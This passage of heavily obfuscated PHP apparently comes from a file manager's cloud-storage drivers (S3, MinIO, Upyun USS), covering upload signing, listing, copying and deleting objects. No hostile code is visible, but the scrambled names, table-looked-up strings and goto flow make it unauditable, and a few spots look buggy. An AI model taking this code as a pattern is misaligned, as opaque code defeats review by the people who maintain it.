array($Üä¡§ŞÉ[249] => $ÔÇÜ¿ó‰); if ($ÛüÕ £) { $Ğç¤ñ¬Ò[$Üä¡§ŞÉ[250]] = $Üä¡§ŞÉ[251] . rawurlencode($ïÄ¼Šœ); } else { } $ºªº¦‡ = $this->link($Ò™§Ìƒ™, $Ğç¤ñ¬Ò); $this->fileOutLink($ºªº¦‡); } public function fileOutServer($êÚ÷ÏÍ€, $°İ¦å„ = false, $§ßóŞü = false, $ï°Ìè¼ö = '') { parent::fileOut($êÚ÷ÏÍ€, $°İ¦å„, $§ßóŞü, $ï°Ìè¼ö); } public function fileOutImageServer($Úóú¼Ãê, $òÕàÅ = 250) { parent::fileOutImage($Úóú¼Ãê, $òÕàÅ); } public function hashMd5($¹‰¾êÑ, $¦˜çŠ† = '') { $°¥²Ãºå = $this->objectMeta($¹‰¾êÑ); if (!$°¥²Ãºå) { return !1; } $¦˜çŠ† = $¦˜çŠ† ? $¦˜çŠ† : _get($°¥²Ãºå, $_SERVER[¦»×‡Ãã][252]); return $¦˜çŠ†; } public function uploadFormData($±áÅı…¶, $Â½€‚ = 3600) { $á¬Úú·™ =& $_SERVER[¦»×‡Ãã]; $Üüºø™ = $this->pathFather($±áÅı…¶); $ÅÙÛ™®› = $this->client->getHttpUploadPostParams($this->bucket, $Üüºø™, $á¬Úú·™[229], $Â½€‚); return array_merge((array) $ÅÙÛ™®›, array($á¬Úú·™[208] => $this->getHost())); } public function multiUploadFormData($¢ëšÒÚ, $¯Î¤Âë´ = 3600) { $£‹äı÷ =& $_SERVER[¦»×‡Ãã]; $«ŒüÍşÔ = gmdate($£‹äı÷[253]); $ÏİØŠ¾Œ = array(); $µùôö = $this->client->getUploadId($this->bucket, $¢ëšÒÚ, $ÏİØŠ¾Œ); if (!$µùôö) { return !1; } return array($£‹äı÷[254] => $µùôö, $£‹äı÷[208] => $this->getHost() . $£‹äı÷[8] . $this->pathEncode($¢ëšÒÚ), $£‹äı÷[255] => $«ŒüÍşÔ, $£‹äı÷[97] => $¢ëšÒÚ); } public function multiUploadAuthData($–ÍîßÕØ, $ë¶É£¡Î = array()) { $á¦Ò„¨” =& $_SERVER[¦»×‡Ãã]; $  ×Ü´Ï = isset($ë¶É£¡Î[$á¦Ò„¨”[255]]) ? $ë¶É£¡Î[$á¦Ò„¨”[255]] : gmdate($á¦Ò„¨”[253]); $Ò·âŒÁ = isset($ë¶É£¡Î[$á¦Ò„¨”[169]]) ? $ë¶É£¡Î[$á¦Ò„¨”[169]] : $á¦Ò„¨”[12]; $ı†ÊÕ° = $ë¶É£¡Î[$á¦Ò„¨”[97]]; unset($ë¶É£¡Î[$á¦Ò„¨”[97]]); if (isset($ë¶É£¡Î[$á¦Ò„¨”[256]])) { $ë¶É£¡Î[$á¦Ò„¨”[255]] = $  ×Ü´Ï; return $this->listUploadParts($ı†ÊÕ°, $ë¶É£¡Î); } $ıÒÖÎ´ = array($á¦Ò„¨”[257], $á¦Ò„¨”[12], $á¦Ò„¨”[123], $á¦Ò„¨”[12], "\x78\x2d\141\155\172\55\144\141\164\x65\72{$  ×Ü´Ï}", $á¦Ò„¨”[8] . $this->bucket . $á¦Ò„¨”[8] . $this->pathEncode($ı†ÊÕ°) . $Ò·âŒÁ); if (strpos($Ò·âŒÁ, $á¦Ò„¨”[258]) === 0) { $ıÒÖÎ´[0] = $á¦Ò„¨”[259]; } if (isset($ë¶É£¡Î[$á¦Ò„¨”[260]]) && $ë¶É£¡Î[$á¦Ò„¨”[260]] == $á¦Ò„¨”[261]) { $ıÒÖÎ´[0] = $á¦Ò„¨”[261]; } $†•­›Ç = implode($á¦Ò„¨”[262], $ıÒÖÎ´); $õÚ…‚ = base64_encode(hash_hmac($á¦Ò„¨”[263], $†•­›Ç, $this->secret, !0)); $ò»€©®æ = $á¦Ò„¨”[264] . $this->accessKey . $á¦Ò„¨”[4] . $õÚ…‚; if (strpos($Ò·âŒÁ, $á¦Ò„¨”[258]) === 0) { return array($á¦Ò„¨”[265] => $ò»€©®æ, $á¦Ò„¨”[255] => $  ×Ü´Ï); } return $ò»€©®æ; } public function listUploadParts($Ñ‚Éâ¯•, $ôò‚ëõ­ = array()) { $šÉşšùü =& $_SERVER[¦»×‡Ãã]; $´¼õó³ = str_replace($šÉşšùü[266], $šÉşšùü[12], $ôò‚ëõ­[$šÉşšùü[169]]); $ÜÄ›öĞ = $this->client->listParts($this->bucket, $Ñ‚Éâ¯•, $´¼õó³); if (!$ÜÄ›öĞ) { return !1; } unset($ôò‚ëõ­[$šÉşšùü[256]], $ôò‚ëõ­[$šÉşšùü[260]]); $ôò‚ëõ­[$šÉşšùü[97]] = $Ñ‚Éâ¯•; $š…˜‘©¹ = $this->multiUploadAuthData($Ñ‚Éâ¯•, $ôò‚ëõ­); if (empty($š…˜‘©¹)) { return !1; } return array($šÉşšùü[265] => $š…˜‘©¹, $šÉşšùü[255] => $ôò‚ëõ­[$šÉşšùü[255]], $šÉşšùü[267] => $ÜÄ›öĞ); } public function getHost() { $ıƒ©™ =& $_SERVER[¦»×‡Ãã]; $²…ÅÎ™” = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ıƒ©™[70], $ıƒ©™[64], $ıƒ©™[69], $ıƒ©™[62]))) { return $²…ÅÎ™” . $ıƒ©™[8] . $this->bucket; } $²…ÅÎ™” = explode($ıƒ©™[210], $²…ÅÎ™”); return $²…ÅÎ™”[0] . $ıƒ©™[210] . $this->bucket . $ıƒ©™[10] . $²…ÅÎ™”[1]; } public function size($¾Ş’•í) { $¼ó—™¯š = $this->objectMeta($¾Ş’•í); return $¼ó—™¯š ? $¼ó—™¯š[$_SERVER[¦»×‡Ãã][79]] : 0; } public function info($¨÷ºù‚ı) { if ($this->isFolder($¨÷ºù‚ı)) { return $this->folderInfo($¨÷ºù‚ı); } else { if ($this->isFile($¨÷ºù‚ı)) { return $this->fileInfo($¨÷ºù‚ı); } } return !1; } public function exist($©ÏØ°ë) { return $this->isFile($©ÏØ°ë) || $this->isFolder($©ÏØ°ë); } public function isFile($åúùÎ¿Ó) { return !$this->isFolder($åúùÎ¿Ó) && $this->objectMeta($åúùÎ¿Ó); } public function isFolder($ „Ø×ûµ) { return $this->cacheMethod($_SERVER[¦»×‡Ãã][179], $ „Ø×ûµ); } protected function objectMeta($ïğ¥àÊ³) { return $this->cacheMethod($_SERVER[¦»×‡Ãã][181], $ïğ¥àÊ³); } protected function _objectMeta($İÓ´âÖó) { $Öß¯¨Í‡ =& $_SERVER[¦»×‡Ãã]; $İÓ´âÖó = rtrim($İÓ´âÖó, $Öß¯¨Í‡[8]); try { $‡¿ø©­ù = $this->client->getObjectInfo($this->bucket, $İÓ´âÖó); if (!isset($‡¿ø©­ù[$Öß¯¨Í‡[252]]) && isset($‡¿ø©­ù[$Öß¯¨Í‡[268]])) { $‡¿ø©­ù[$Öß¯¨Í‡[252]] = $‡¿ø©­ù[$Öß¯¨Í‡[268]]; } } catch (Exception $²Ò†¸¡) { $‡¿ø©­ù = !1; } if (!$‡¿ø©­ù) { } return $‡¿ø©­ù; } protected function _isFolder($ƒÁ“‹„‘) { $ó†ş¡¸¦ =& $_SERVER[¦»×‡Ãã]; $ƒÁ“‹„‘ = rtrim($ƒÁ“‹„‘, $ó†ş¡¸¦[8]); if ($ƒÁ“‹„‘ == $ó†ş¡¸¦[12] || $ƒÁ“‹„‘ == $ó†ş¡¸¦[8]) { return !0; } $À¿¬ï“  = $this->client->getBucket($this->bucket, $ƒÁ“‹„‘, null, 1); if (empty($À¿¬ï“ [$ó†ş¡¸¦[236]])) { return !1; } $ı¬¾Ù¯Õ = $À¿¬ï“ [$ó†ş¡¸¦[236]][0][$ó†ş¡¸¦[32]]; return stripos($ı¬¾Ù¯Õ, $ƒÁ“‹„‘ . $ó†ş¡¸¦[8]) === 0 ? !0 : !1; if (substr($ı¬¾Ù¯Õ, -1) == $ó†ş¡¸¦[8]) { return !0; } if (get_path_this($ı¬¾Ù¯Õ) == get_path_this($ƒÁ“‹„‘)) { return !1; } return !0; } public function listObject($Éòä¤¯×) { return $this->fileList($Éòä¤¯×, $_SERVER[¦»×‡Ãã][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ÃœŠøû) { $´ààÄ =& $_SERVER[¦»×‡Ãã]; parent::__construct($ÃœŠøû); $this->setSignVersion($´ààÄ[247]); if (!$this->region) { $this->region = $´ààÄ[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ŠÃÖ¾ š = $this->getBucketRgn(); return $this->region == $ŠÃÖ¾ š ? !0 : !1; } public function uploadFormData($Ä™Îâ¶, $İïÃôøû = 3600) { $–„¸Ïó‰ =& $_SERVER[¦»×‡Ãã]; $”•ìšàÂ = $–„¸Ïó‰[229]; $İù—Ö¼€ = $–„¸Ïó‰[270]; $Æ°¼Áá¸ = $–„¸Ïó‰[62]; $ŠÒ£®¦ = gmdate($–„¸Ïó‰[271]); $í¸Ø–Ş† = gmdate($–„¸Ïó‰[272]); $™ïéñÌ  = $–„¸Ïó‰[273]; $ç¬ì¬¾ş = $İïÃôøû . $–„¸Ïó‰[12]; $à’ïßàü = $–„¸Ïó‰[274]; $¸ÎıÔ = array($this->accessKey, $í¸Ø–Ş†, $this->region, $Æ°¼Áá¸, $™ïéñÌ ); $è»¶Ã¾ë = implode($–„¸Ïó‰[8], $¸ÎıÔ); $›¢â‰åñ = array($–„¸Ïó‰[275] => gmdate($–„¸Ïó‰[276], strtotime($–„¸Ïó‰[277])), $–„¸Ïó‰[278] => array(array($–„¸Ïó‰[279] => $this->bucket), array($–„¸Ïó‰[280] => $”•ìšàÂ), array($–„¸Ïó‰[281], $–„¸Ïó‰[282], $–„¸Ïó‰[12]), array($–„¸Ïó‰[281], $–„¸Ïó‰[283], $–„¸Ïó‰[12]), array($–„¸Ïó‰[281], $–„¸Ïó‰[284], $–„¸Ïó‰[12]), array($–„¸Ïó‰[285] => $à’ïßàü), array($–„¸Ïó‰[286] => $è»¶Ã¾ë), array($–„¸Ïó‰[287] => $İù—Ö¼€), array($–„¸Ïó‰[288] => $ŠÒ£®¦), array($–„¸Ïó‰[289] => $ç¬ì¬¾ş))); $ôÃªïÉ› = base64_encode(json_encode($›¢â‰åñ)); $¡²·½¡û = hash_hmac($–„¸Ïó‰[290], $í¸Ø–Ş†, $–„¸Ïó‰[291] . $this->secret, !0); $å¤â¦Ü = hash_hmac($–„¸Ïó‰[290], $this->region, $¡²·½¡û, !0); $‘İõ½£± = hash_hmac($–„¸Ïó‰[290], $Æ°¼Áá¸, $å¤â¦Ü, !0); $Îã´øâÈ = hash_hmac($–„¸Ïó‰[290], $™ïéñÌ , $‘İõ½£±, !0); $¸´©½êë = hash_hmac($–„¸Ïó‰[290], $ôÃªïÉ›, $Îã´øâÈ); $ÄÕ‡óÑ¾ = array($–„¸Ïó‰[246] => $–„¸Ïó‰[12], $–„¸Ïó‰[292] => $–„¸Ïó‰[12], $–„¸Ïó‰[280] => $”•ìšàÂ, $–„¸Ïó‰[285] => $à’ïßàü, $–„¸Ïó‰[293] => $ôÃªïÉ›, $–„¸Ïó‰[294] => $è»¶Ã¾ë, $–„¸Ïó‰[295] => $İù—Ö¼€, $–„¸Ïó‰[296] => $ŠÒ£®¦, $–„¸Ïó‰[297] => $ç¬ì¬¾ş, $–„¸Ïó‰[298] => $¸´©½êë, $–„¸Ïó‰[208] => $this->getHost()); return $ÄÕ‡óÑ¾; } } goto eÜ¼½èÑÌ; BÆÃ±âÅÂš: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\72\57\x2f\x76\x30\56\x61\160\x69\56\x75\160\x79\165\x6e\56\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($œğÕ¼ø) { parent::__construct(); $this->_init($œğÕ¼ø); } public function _init($Œœ½ÎÃ…) { $òö·ÚÛ =& $_SERVER[¦»×‡Ãã]; foreach ($Œœ½ÎÃ… as $ÕÉàØÛ¨ => $»úŸÃæ§) { if (isset($this->{$ÕÉàØÛ¨})) { $this->{$ÕÉàØÛ¨} = $»úŸÃæ§; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($òö·ÚÛ[1545] . LNG($òö·ÚÛ[1464])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Ï‰ñåéÒ, $ºÄ°¸‰€ = "\107\x45\124") { $®Ì£çµ =& $_SERVER[¦»×‡Ãã]; $®³ÁìüÅ = gmdate($®Ì£çµ[1493]); $¦£µ¤‹ˆ = base64_encode(hash_hmac($®Ì£çµ[1546], "{$ºÄ°¸‰€}\x26{$Ï‰ñåéÒ}\46{$®³ÁìüÅ}", md5("{$this->userpass}"), !0)); $•ĞªåûÔ = array("\x41\165\164\x68\x6f\x72\151\172\141\x74\151\x6f\x6e\x3a\x55\x50\x59\125\x4e\40{$this->username}\72{$¦£µ¤‹ˆ}", "\x44\141\x74\145\72{$®³ÁìüÅ}"); return $•ĞªåûÔ; } public function ussRequest($è·‹úŒß, $çÚÅÒş– = "\x47\x45\x54", $èˆÄ€åÍ = false, $ğ±‹›— = false, $‚óÊ“Î¤ = false) { $¦™Î÷‰ª =& $_SERVER[¦»×‡Ãã]; $è·‹úŒß = trim($è·‹úŒß, $¦™Î÷‰ª[8]); $ıïÁÒ¼á = "\x2f{$this->bucket}\57{$è·‹úŒß}"; $íÄà­´Ä = $this->ussHeaders($ıïÁÒ¼á, $çÚÅÒş–); if ($ğ±‹›—) { $íÄà­´Ä = array_merge($íÄà­´Ä, $ğ±‹›—); } $­ó‘Áí” = url_request($this->endpoint . $ıïÁÒ¼á, $çÚÅÒş–, $èˆÄ€åÍ, $íÄà­´Ä, $‚óÊ“Î¤); if (!$­ó‘Áí”) { $±Ñ‘ÓöÎ = LNG($¦™Î÷‰ª[1547]); $this->writeLog($±Ñ‘ÓöÎ); return array($¦™Î÷‰ª[1297] => !1, $¦™Î÷‰ª[1287] => $±Ñ‘ÓöÎ); } if (strtolower($çÚÅÒş–) == $¦™Î÷‰ª[227] || in_array($­ó‘Áí”[$¦™Î÷‰ª[1297]], array($¦™Î÷‰ª[274], $¦™Î÷‰ª[1548]))) { $èˆÄ€åÍ = $­ó‘Áí”[$¦™Î÷‰ª[1549]]; } else { $èˆÄ€åÍ = json_decode($­ó‘Áí”[$¦™Î÷‰ª[1287]], !0); if (!$èˆÄ€åÍ) { $èˆÄ€åÍ = $­ó‘Áí”[$¦™Î÷‰ª[1287]]; } else { if (!$­ó‘Áí”[$¦™Î÷‰ª[823]] && isset($èˆÄ€åÍ[$¦™Î÷‰ª[1550]])) { $èˆÄ€åÍ = $èˆÄ€åÍ[$¦™Î÷‰ª[1550]]; } } } if (!$­ó‘Áí”[$¦™Î÷‰ª[823]]) { $this->writeLog($this->__errorMessage($èˆÄ€åÍ)); } return array($¦™Î÷‰ª[1297] => $­ó‘Áí”[$¦™Î÷‰ª[823]], $¦™Î÷‰ª[1287] => $èˆÄ€åÍ); } private function __errorMessage($ÙœÛ´¼¹) { $Í€€ÚŸÁ =& $_SERVER[¦»×‡Ãã]; if (!$ÙœÛ´¼¹) { return $Í€€ÚŸÁ[12]; } static $Àû¨¸ıÄ = null; if (!$Àû¨¸ıÄ) { $Àû¨¸ıÄ = I18n::getType(); } if ($Àû¨¸ıÄ != $Í€€ÚŸÁ[1503]) { return $ÙœÛ´¼¹; } $õ²Ø¤¡ô = array($Í€€ÚŸÁ[1551] => $Í€€ÚŸÁ[1552], $Í€€ÚŸÁ[1553] => $Í€€ÚŸÁ[1554], $Í€€ÚŸÁ[1555] => $Í€€ÚŸÁ[1554], $Í€€ÚŸÁ[1556] => $Í€€ÚŸÁ[1557], $Í€€ÚŸÁ[1558] => $Í€€ÚŸÁ[1559], $Í€€ÚŸÁ[1560] => $Í€€ÚŸÁ[1561], $Í€€ÚŸÁ[1562] => $Í€€ÚŸÁ[1563]); return isset($õ²Ø¤¡ô[$ÙœÛ´¼¹]) ? $õ²Ø¤¡ô[$ÙœÛ´¼¹] : $ÙœÛ´¼¹; } public function mkfile($•ä—ò¿™, $±’„è = '', $Ã¦Ö¤ = REPEAT_RENAME) { if ($this->setContent($•ä—ò¿™, $±’„è)) { return $this->getPathOuter($•ä—ò¿™); } return !1; } public function mkdir($¡ÎÑà¢è, $¹©İ»–ã = REPEAT_SKIP) { $òõòíĞ× =& $_SERVER[¦»×‡Ãã]; $ëÌŸ‚Âõ = trim($¡ÎÑà¢è, $òõòíĞ×[8]); if ($this->_isFolder($ëÌŸ‚Âõ)) { return $this->getPathOuter($ëÌŸ‚Âõ); } $š„¾†Ğ = array($òõòíĞ×[1564]); $ö„ºÆâ· = $this->ussRequest($ëÌŸ‚Âõ, $òõòíĞ×[257], !1, $š„¾†Ğ); return $ö„ºÆâ·[$òõòíĞ×[1297]] ? $this->getPathOuter($ëÌŸ‚Âõ) : !1; } public function copyFile($İğÈÆ‘Œ, $Ğ©çÍ–¾) { $èª˜°µË =& $_SERVER[¦»×‡Ãã]; $ß²Ó† = array($èª˜°µË[1565] . "\57{$this->bucket}\57{$İğÈÆ‘Œ}", $èª˜°µË[1566]); $™ê­ê¸Ä = $this->ussRequest($Ğ©çÍ–¾, $èª˜°µË[259], !1, $ß²Ó†); return $™ê­ê¸Ä[$èª˜°µË[1297]] ? !0 : $this->getPathOuter($Ğ©çÍ–¾); } public function moveFile($ªõüŞ—‚, $£¦€Ğì²) { $ÌîïİÊ =& $_SERVER[¦»×‡Ãã]; $¢°‘éÎß = array($ÌîïİÊ[1567] . "\x2f{$this->bucket}\57{$ªõüŞ—‚}", $ÌîïİÊ[1566]); $ùÈğ»Øß = $this->ussRequest($£¦€Ğì², $ÌîïİÊ[259], !1, $¢°‘éÎß); return $ùÈğ»Øß[$ÌîïİÊ[1297]] ? !0 : $this->getPathOuter($£¦€Ğì²); } public function delFile($ğëñß—ü) { $õè“—Â =& $_SERVER[¦»×‡Ãã]; $ÚÉ”­í§ = $this->ussRequest($ğëñß—ü, $õè“—Â[1568]); return $ÚÉ”­í§[$õè“—Â[1297]] ? !0 : !1; } public function delFolder($–¢ˆå¡) { $ÙŠÂ¯™ =& $_SERVER[¦»×‡Ãã]; if (!$this->exist($–¢ˆå¡)) { return !0; } $this->listItemCache = !1; $«ú£­Ú‘ = $Íı·ÅıÆ = array(); $this->fileList($–¢ˆå¡, $«ú£­Ú‘, $Íı·ÅıÆ, !0); $this->listItemCache = !0; foreach ($Íı·ÅıÆ as $èíüê«á) { $¯«÷Ğñé = $this->ussRequest($èíüê«á[$ÙŠÂ¯™[32]], $ÙŠÂ¯™[1568]); if (!$¯«÷Ğñé[$ÙŠÂ¯™[1297]]) { return !1; } } foreach ($«ú£­Ú‘ as $áÆ—Æñ£) { $¯«÷Ğñé = $this->ussRequest($áÆ—Æñ£, $ÙŠÂ¯™[1568]); if (!$¯«÷Ğñé[$ÙŠÂ¯™[1297]]) { return !1; } } $¯«÷Ğñé = $this->ussRequest($–¢ˆå¡, $ÙŠÂ¯™[1568]); return $¯«÷Ğñé[$ÙŠÂ¯™[1297]]; } public function rename($€¹Ãõ·¥, $¤ä¼ü¥‚) { if ($this->isFile($€¹Ãõ·¥)) { $¤ä¼ü¥‚ = get_path_father($€¹Ãõ·¥) . $¤ä¼ü¥‚; return $this->moveFile($€¹Ãõ·¥, $¤ä¼ü¥‚); } return $this->renameObject($€¹Ãõ·¥, $¤ä¼ü¥‚); } public function fileInfo($Ë¤ñÉ´Ÿ, $ïº Ó‰  = false, $¤’Ş¨„ß = array()) { $Æ©®Õ¶ =& $_SERVER[¦»×‡Ãã]; $×”‚Å½ = array($Æ©®Õ¶[32] => $this->pathThis($Ë¤ñÉ´Ÿ), $Æ©®Õ¶[87] => $this->getPathOuter($Æ©®Õ¶[8] . $Ë¤ñÉ´Ÿ), $Æ©®Õ¶[33] => $Æ©®Õ¶[230], $Æ©®Õ¶[79] => isset($¤’Ş¨„ß[$Æ©®Õ¶[79]]) ? $¤’Ş¨„ß[$Æ©®Õ¶[79]] : 0, $Æ©®Õ¶[169] => $this->ext($Ë¤ñÉ´Ÿ)); if ($ïº Ó‰ ) { return $×”‚Å½; } $×”‚Å½[$Æ©®Õ¶[231]] = $×”‚Å½[$Æ©®Õ¶[88]] = 0; $×”‚Å½[$Æ©®Õ¶[232]] = $×”‚Å½[$Æ©®Õ¶[233]] = !0; if (empty($¤’Ş¨„ß)) { $¤’Ş¨„ß = $this->objectMeta($Ë¤ñÉ´Ÿ); if (!$¤’Ş¨„ß) { return $×”‚Å½; } } $×”‚Å½[$Æ©®Õ¶[231]] = intval($¤’Ş¨„ß[$Æ©®Õ¶[1569]]); $×”‚Å½[$Æ©®Õ¶[88]] = intval($¤’Ş¨„ß[$Æ©®Õ¶[1570]]); $×”‚Å½[$Æ©®Õ¶[79]] = $¤’Ş¨„ß[$Æ©®Õ¶[79]]; return $×”‚Å½; } public function folderInfo($²”İîÇš, $åõ¨ÍÖÁ = false) { $”«¼ÙÏª =& $_SERVER[¦»×‡Ãã]; $õÑõ¬Ûß = array($”«¼ÙÏª[32] => $this->pathThis($²”İîÇš), $”«¼ÙÏª[87] => $this->getPathOuter($”«¼ÙÏª[8] . $²”İîÇš), $”«¼ÙÏª[33] => $”«¼ÙÏª[78]); if ($åõ¨ÍÖÁ) { return $õÑõ¬Ûß; } $õÑõ¬Ûß[$”«¼ÙÏª[231]] = $õÑõ¬Ûß[$”«¼ÙÏª[88]] = 0; $õÑõ¬Ûß[$”«¼ÙÏª[232]] = $õÑõ¬Ûß[$”«¼ÙÏª[233]] = !0; if (empty($…ØÛƒÁŸ)) { $…ØÛƒÁŸ = $this->objectMeta($²”İîÇš); if (!$…ØÛƒÁŸ) { return $õÑõ¬Ûß; } } $õÑõ¬Ûß[$”«¼ÙÏª[231]] = intval($…ØÛƒÁŸ[$”«¼ÙÏª[1569]]); $õÑõ¬Ûß[$”«¼ÙÏª[88]] = intval($…ØÛƒÁŸ[$”«¼ÙÏª[1570]]); return $õÑõ¬Ûß; } private function listObjs($ç·ğàÑè, $·ê•ï–¸ = 0, $»ËšŒ·ë = 1000) { $¸çËÊ€¸ =& $_SERVER[¦»×‡Ãã]; $™í«Ñ’ü = array($¸çËÊ€¸[1571], $¸çËÊ€¸[1572] . $»ËšŒ·ë); if ($·ê•ï–¸) { $™í«Ñ’ü[] = $¸çËÊ€¸[1573] . $·ê•ï–¸; } $ûğš£»Ó = $this->ussRequest($ç·ğàÑè, $¸çËÊ€¸[261], !1, $™í«Ñ’ü); return !$ûğš£»Ó[$¸çËÊ€¸[1297]] ? !1 : $ûğš£»Ó[$¸çËÊ€¸[1287]]; } private function fileList($ŠŒÕù¿, &$˜Ö‚Ëí, &$¸ë“­äİ, $Ù¢µ©Ï  = false) { $‚â”££Ğ =& $_SERVER[¦»×‡Ãã]; $Ññäüë = $‚â”££Ğ[12]; $§‹áü†Ş = 1000; $²Ã˜â…® = rtrim($ŠŒÕù¿, $‚â”££Ğ[8]) . $‚â”££Ğ[8]; while (!0) { check_abort(); $¡œ‡îÛ· = $this->listObjs($ŠŒÕù¿, $Ññäüë, $§‹áü†Ş); if (!$¡œ‡îÛ·) { return !1; } $Ññäüë = isset($¡œ‡îÛ·[$‚â”££Ğ[1574]]) ? $¡œ‡îÛ·[$‚â”££Ğ[1574]] : $‚â”££Ğ[12]; $ÃÙûâÓ´ = isset($¡œ‡îÛ·[$‚â”££Ğ[1575]]) ? $¡œ‡îÛ·[$‚â”££Ğ[1575]] : array(); foreach ($ÃÙûâÓ´ as $ì¹üú ù) { $Õ¯â²šì = $ì¹üú ù[$‚â”££Ğ[33]] == $‚â”££Ğ[78] ? !0 : !1; $‰°›©ÆŒ = ltrim($²Ã˜â…® . $ì¹üú ù[$‚â”££Ğ[32]], $‚â”££Ğ[8]) . ($Õ¯â²šì ? $‚â”££Ğ[8] : $‚â”££Ğ[12]); $ò­…¾ü = array($‚â”££Ğ[32] => $‰°›©ÆŒ, $‚â”££Ğ[33] => $Õ¯â²šì ? $‚â”££Ğ[78] : $‚â”££Ğ[230], $‚â”££Ğ[79] => $ì¹üú ù[$‚â”££Ğ[413]], $‚â”££Ğ[1570] => $ì¹üú ù[$‚â”££Ğ[1576]]); $this->cacheMethodInfoSet($‰°›©ÆŒ, $Õ¯â²šì, $ò­…¾ü); if ($Õ¯â²šì) { $˜Ö‚Ëí[] = $‰°›©ÆŒ; if ($Ù¢µ©Ï ) { $this->fileList($‰°›©ÆŒ, $˜Ö‚Ëí, $¸ë“­äİ, $Ù¢µ©Ï ); } continue; } $¸ë“­äİ[] = $ò­…¾ü; } if (count($ÃÙûâÓ´) < $§‹áü†Ş) { break; } } $this->cacheMethodInfoSet($ŠŒÕù¿, !0); } public function listPath($Ï®ü‚ƒã, $‰Õ–ö¥’ = false) { $ÔÔ³‚· =& $_SERVER[¦»×‡Ãã]; $ºú“ÉÒ = $ö¦ã«¿ = array(); $this->fileList($Ï®ü‚ƒã, $ºú“ÉÒ, $ö¦ã«¿); foreach ($ºú“ÉÒ as $üü«Çšæ => $¾Š ˜“¾) { $ºú“ÉÒ[$üü«Çšæ] = $this->folderInfo($¾Š ˜“¾, $‰Õ–ö¥’); } foreach ($ö¦ã«¿ as $üü«Çšæ => $¾Š ˜“¾) { $ö¦ã«¿[$üü«Çšæ] = $this->fileInfo($¾Š ˜“¾[$ÔÔ³‚·[32]], $‰Õ–ö¥’, $¾Š ˜“¾); } return array($ÔÔ³‚·[85] => $ºú“ÉÒ, $ÔÔ³‚·[86] => $ö¦ã«¿); } public function has($½–ÎŠ¹Ñ, $¶Ğ—ãÌÍ = false, $ÕÒıÚËŞ = true) { $…”ÅùÉ =& $_SERVER[¦»×‡Ãã]; $‘ôÃŒ = $…”ÅùÉ[12]; $à„ŒĞÚğ = 500; $¥ÖûÛ‡» = 0; $¢ Ï÷¶ = 0; $¸Æ³·¢ = rtrim($½–ÎŠ¹Ñ, $…”ÅùÉ[8]) . $…”ÅùÉ[8]; while (!0) { check_abort(); $Ï¯é¢§Ü = $this->listObjs($½–ÎŠ¹Ñ, $‘ôÃŒ, $à„ŒĞÚğ); if (!$Ï¯é¢§Ü) { return !1; } $‘ôÃŒ = isset($Ï¯é¢§Ü[$…”ÅùÉ[1574]]) ? $Ï¯é¢§Ü[$…”ÅùÉ[1574]] : $…”ÅùÉ[12]; $÷çÚË·Š = isset($Ï¯é¢§Ü[$…”ÅùÉ[1575]]) ? $Ï¯é¢§Ü[$…”ÅùÉ[1575]] : array(); if (empty($÷çÚË·Š)) { break; } $â§ÏË¬ª = array_filter($÷çÚË·Š, function ($öœ¥‘±´) { $ş¾÷Š±Š =& $_SERVER[¦»×‡Ãã]; return $öœ¥‘±´[$ş¾÷Š±Š[33]] == $ş¾÷Š±Š[78]; }); $‰°¬ŒçÆ = count($÷çÚË·Š); $â§ÏË¬ª = count($â§ÏË¬ª); $Ç½¸Ãç« = $‰°¬ŒçÆ - $â§ÏË¬ª; if ($¶Ğ—ãÌÍ) { $¢ Ï÷¶ += $â§ÏË¬ª; $¥ÖûÛ‡» += $Ç½¸Ãç«; if ($‰°¬ŒçÆ < $à„ŒĞÚğ) { break; } continue; } if ($ÕÒıÚËŞ) { if ($Ç½¸Ãç«) { return !0; } } else { if ($â§ÏË¬ª) { return !0; } } if ($‰°¬ŒçÆ < $à„ŒĞÚğ) { break; } } if ($¶Ğ—ãÌÍ) { return array($…”ÅùÉ[239] => $¥ÖûÛ‡», $…”ÅùÉ[240] => $¢ Ï÷¶); } return !1; } public function listAll($şÄ˜‰âÌ) { $¤´¹Œ×Î =& $_SERVER[¦»×‡Ãã]; $‚¦¨“£É = $÷ùèâÆ = array(); $this->fileList($şÄ˜‰âÌ, $‚¦¨“£É, $÷ùèâÆ, !0); $ŞŠŠØİ = array_to_keyvalue($÷ùèâÆ, $¤´¹Œ×Î[32]); foreach ($‚¦¨“£É as $ÒßÓ™»«) { if (is_string($ÒßÓ™»«)) { $ŞŠŠØİ[$ÒßÓ™»«] = array($¤´¹Œ×Î[79] => 0); } } return $this->listAllFiles($şÄ˜‰âÌ, $ŞŠŠØİ); } public function canRead($“¹ÊşüÖ) { return $this->exist($“¹ÊşüÖ) ? !0 : !1; } public function canWrite($–İÜ…Üë) { return $this->exist($–İÜ…Üë) ? !0 : !1; } public function getContent($ÚìøŒ›Ä) { return $this->fileSubstr($ÚìøŒ›Ä, 0, -1); } public function setContent($İ×®õ•¡, $Ú¶µ€Ø¸ = '') { $›ÂóÜ =& $_SERVER[¦»×‡Ãã]; if (!$Ú¶µ€Ø¸) { $¼™ûÇŞˆ = $this->ussRequest($İ×®õ•¡, $›ÂóÜ[257]); return $¼™ûÇŞˆ[$›ÂóÜ[1297]]; } $…ä¢Ö = $this->tempFile($this->pathThis($İ×®õ•¡)); file_put_contents($…ä¢Ö, $Ú¶µ€Ø¸); if ($this->upload($İ×®õ•¡, $…ä¢Ö)) { $this->tempFileRemve($…ä¢Ö); return !0; } return !1; } public function fileSubstr($ıã²Á¯ë, $üæ×´ÌÀ, $ÓµÕ‡À) { $’ÃÊˆÁó =& $_SERVER[¦»×‡Ãã]; if (!($øòÑËı¸ = $this->link($ıã²Á¯ë))) { return !1; } $«Ø¶€Û = !1; if ($ÓµÕ‡À > 0) { $§Û’âŸñ = $üæ×´ÌÀ + $ÓµÕ‡À - 1; $«Ø¶€Û = array($’ÃÊˆÁó[1535] . 